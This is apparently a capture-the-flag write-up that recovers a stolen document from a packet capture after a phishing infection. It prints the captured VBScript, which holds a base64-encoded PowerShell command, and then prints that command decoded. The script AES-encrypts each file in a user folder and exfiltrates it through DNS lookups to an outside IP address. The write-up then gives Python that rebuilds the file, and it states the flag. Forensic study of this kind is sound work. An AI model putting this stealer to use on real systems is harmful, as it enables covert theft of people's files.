# phished

```
We fired Billy last week after he failed a phishing test for the 6th time. We wiped his machine, but now we really need one of the files that was on it. Maybe he uploaded it somewhere? Do you think you can get it back from this packet capture?
```

Open the pcap in Wireshark, we find a VB script:

```vb
        Set objShell = CreateObject("WScript.Shell")
        objShell.Run "powershell.exe -EncodedCommand ZgB1AG4AYwB0AGkAbwBuACAAQwByAGUAYQB0AGUALQBBAGUAcwBNAGEAbgBhAGcAZQBkAE8AYgBqAGUAYwB0ACgAJABrAGUAeQAsACAAJABJAFYAKQAgAHsACgAkAGEAZQBzAE0AYQBuAGEAZwBlAGQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgACIAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAEEAZQBzAE0AYQBuAGEAZwBlAGQAIgAKACQAYQBlAHMATQBhAG4AYQBnAGUAZAAuAE0AbwBkAGUAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AQwBpAHAAaABlAHIATQBvAGQAZQBdADoAOgBDAEIAQwAKACQAYQBlAHMATQBhAG4AYQBnAGUAZAAuAFAAYQBkAGQAaQBuAGcAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AUABhAGQAZABpAG4AZwBNAG8AZABlAF0AOgA6AFoAZQByAG8AcwAKACQAYQBlAHMATQBhAG4AYQBnAGUAZAAuAEIAbABvAGMAawBTAGkAegBlACAAPQAgADEAMgA4AAoAJABhAGUAcwBNAGEAbgBhAGcAZQBkAC4ASwBlAHkAUwBpAHoAZQAgAD0AIAAyADUANgAKAGkAZgAgACgAJABJAFYAKQAgAHsACgBpAGYAIAAoACQASQBWAC4AZwBlAHQAVAB5AHAAZQAoACkALgBOAGEAbQBlACAALQBlAHEAIAAiAFMAdAByAGkAbgBnACIAKQAgAHsACgAkAGEAZQBzAE0AYQBuAGEAZwBlAGQALgBJAFYAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQASQBWACkACgB9AAoAZQBsAHMAZQAgAHsACgAkAGEAZQBzAE0AYQBuAGEAZwBlAGQALgBJAFYAIAA9ACAAJABJAFYACgB9AAoAfQAKAGkAZgAgACgAJABrAGUAeQApACAAewAKAGkAZgAgACgAJABrAGUAeQAuAGcAZQB0AFQAeQBwAGUAKAApAC4ATgBhAG0AZQAgAC0AZQBxACAAIgBTAHQAcgBpAG4AZwAiACkAIAB7AAoAJABhAGUAcwBNAGEAbgBhAGcAZQBkAC4ASwBlAHkAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAawBlAHkAKQAKAH0ACgBlAGwAcwBlACAAewAKACQAYQBlAHMATQBhAG4AYQBnAGUAZAAuAEsAZQB5ACAAPQAgACQAawBlAHkACgB9AAoAfQAKACQAYQBlAHMATQBhAG4AYQBnAGUAZAAKAH0ACgBmAHUAbgBjAHQAaQBvAG4AIABFAG4AYwByAHkAcAB0AC0AQgB5AHQAZQBzACgAJABrAGUAeQAsACAAJABiAHkAdABlAHMAKQAgAHsACgAkAGEAZQBzAE0AYQBuAGEAZwBlAGQAIAA9ACAAQwByAGUAYQB0AGUALQBBAGUAcwBNAGEAbgBhAGcAZQBkAE8AYgBqAGUAYwB0ACAAJABrAGUAeQAKACQAZQBuAGMAcgB5AHAAdABvAHIAIAA9ACAAJABhAGUAcwBNAGEAbgBhAGcAZQBkAC4AQwByAGUAYQB0AGUARQBuAGMAcgB5AHAAdABvAHIAKAApAAoAJABlAG4AYwByAHkAcAB0AGUAZABEAGEAdABhACAAPQAgACQAZQBuAGMAcgB5AHAAdABvAHIALgBUAHIAYQBuAHMAZgBvAHIAbQBGAGkAbgBhAGwAQgBsAG8AYwBrACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQAKAFsAYgB5AHQAZQBbAF0AXQAgACQAZgB1AGwAbABEAGEAdABhACAAPQAgACQAYQBlAHMATQBhAG4AYQBnAGUAZAAuAEkAVgAgACsAIAAkAGUAbgBjAHIAeQBwAHQAZQBkAEQAYQB0AGEACgAkAGEAZQBzAE0AYQBuAGEAZwBlAGQALgBEAGkAcwBwAG8AcwBlACgAKQAKAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAZgB1AGwAbABEAGEAdABhACkACgB9AAoAJABrACAAPQAgACIAMgB6AGQAWQBCAE4AVQB5ADEAdwBCAEgATQBaAEkAbwA3AG4ANgBLAHUAcQBPADgAVgB2ADgAYgBpAFYAZwB2AGoAeABxAEQALwArAEQAUwBuAGgAUQA9ACIACgAkAGQAIAA9ACAAIgAzADQALgAzADAALgA0ADAALgAxADEANAAiAAoAJABzACAAPQAgADQACgAkAGIAIAA9ACAANQA3AAoARwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgACIAfgAvAEYAaQBsAGUAcwAiACAAfAAgAEYAbwByAGUAYQBjAGgALQBPAGIAagBlAGMAdAAgAHsACgAkAGEAIAA9ACAAJABfAC4ATgBhAG0AZQAKACQAegAgAD0AIABbAFMAeQBzAHQAZQBtAC4ASQBPAC4ARgBpAGwAZQBdADoAOgBSAGUAYQBkAEEAbABsAEIAeQB0AGUAcwAoACQAXwAuAEYAdQBsAGwATgBhAG0AZQApAAoAJABlACAAPQAgAEUAbgBjAHIAeQBwAHQALQBCAHkAdABlAHMAIAAkAGsAIAAkAHoACgAkAGwAIAA9ACAAJABlAC4ATABlAG4AZwB0AGgACgAkAHIAIAA9ACAAIgAiAAoAJABuACAAPQAgADAACgB3AGgAaQBsAGUAIAAoACQAbgAgAC0AbABlACAAKAAkAGwAIAAvACAAJABiACkAKQAgAHsACgAkAGMAIAA9ACAAJABiAAoAaQBmACAAKAAoACQAbgAgACoAIAAkAGIAKQAgACsAIAAkAGMAIAAtAGcAdAAgACQAbAApACAAewAKACQAYwAgAD0AIAAkAGwAIAAtACAAKAAkAG4AIAAqACAAJABiACkACgB9AAoAJAByACAAKwA9ACAAJABlAC4AUwB1AGIAcwB0AHIAaQBuAGcAKAAkAG4AIAAqACAAJABiACwAIAAkAGMAKQAgACsAIAAiAC0ALgAiAAoAaQBmACAAKAAoACQAbgAgACUAIAAkAHMAKQAgAC0AZQBxACAAKAAkAHMAIAAtACAAMQApACkAIAB7AAoAbgBzAGwAbwBvAGsAdQBwACAALQB0AHkAcABlAD0AQQAgACQAcgAkAGEALgAgACQAZAA7ACAAJAByACAAPQAgACIAIgAKAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0ATQBpAGwAbABpAHMAZQBjAG8AbgBkAHMAIAAxADUANwAKAH0ACgAkAG4AIAA9ACAAJABuACAAKwAgADEACgB9AAoAbgBzAGwAbwBvAGsAdQBwACAALQB0AHkAcABlAD0AQQAgACQAcgAkAGEALgAgACQAZAAKAH0A", 0, False 
```

The power shell script is:

```powershell
function Create-AesManagedObject($key, $IV) {
$aesManaged = New-Object "System.Security.Cryptography.AesManaged"
$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
$aesManaged.BlockSize = 128
$aesManaged.KeySize = 256
if ($IV) {
if ($IV.getType().Name -eq "String") {
$aesManaged.IV = [System.Convert]::FromBase64String($IV)
}
else {
$aesManaged.IV = $IV
}
}
if ($key) {
if ($key.getType().Name -eq "String") {
$aesManaged.Key = [System.Convert]::FromBase64String($key)
}
else {
$aesManaged.Key = $key
}
}
$aesManaged
}
function Encrypt-Bytes($key, $bytes) {
$aesManaged = Create-AesManagedObject $key
$encryptor = $aesManaged.CreateEncryptor()
$encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
[byte[]] $fullData = $aesManaged.IV + $encryptedData
$aesManaged.Dispose()
[System.Convert]::ToBase64String($fullData)
}
$k = "2zdYBNUy1wBHMZIo7n6KuqO8Vv8biVgvjxqD/+DSnhQ="
$d = "34.30.40.114"
$s = 4
$b = 57
Get-ChildItem "~/Files" | Foreach-Object {
$a = $_.Name
$z = [System.IO.File]::ReadAllBytes($_.FullName)
$e = Encrypt-Bytes $k $z
$l = $e.Length
$r = ""
$n = 0
while ($n -le ($l / $b)) {
$c = $b
if (($n * $b) + $c -gt $l) {
$c = $l - ($n * $b)
}
$r += $e.Substring($n * $b, $c) + "-."
if (($n % $s) -eq ($s - 1)) {
nslookup -type=A $r$a. $d; $r = ""
Start-Sleep -Milliseconds 157
}
$n = $n + 1
}
nslookup -type=A $r$a. $d
}
```

It encrypts files under `~/Files` and send data via dns. Recover the `flag.docx` from DNS queries:

```python
from scapy.all import *
from Cryptodome.Cipher import AES
import base64

scapy_cap = rdpcap('phished.pcapng')
enc = ""
for packet in scapy_cap:
    if DNS in packet:
        if packet[DNS].ancount > 0:
            continue
        for query in packet[DNS].qd:
            if b"flag.docx" in query.qname:
                print(query.qname)
                parts = query.qname.decode().split(".")[:-3]
                for part in parts:
                    enc += part[:-1]
                print(parts)
raw = base64.b64decode(enc)
key = base64.b64decode("2zdYBNUy1wBHMZIo7n6KuqO8Vv8biVgvjxqD/+DSnhQ=")
cipher = AES.new(key, AES.MODE_CBC, raw[:16])
data = cipher.decrypt(raw[16:])
open("flag.docx", "wb").write(data)
```

In the `flag.docx`, flag is `K17{inf0_stealer?n@h_1t's_a_fr33_backup!}`.
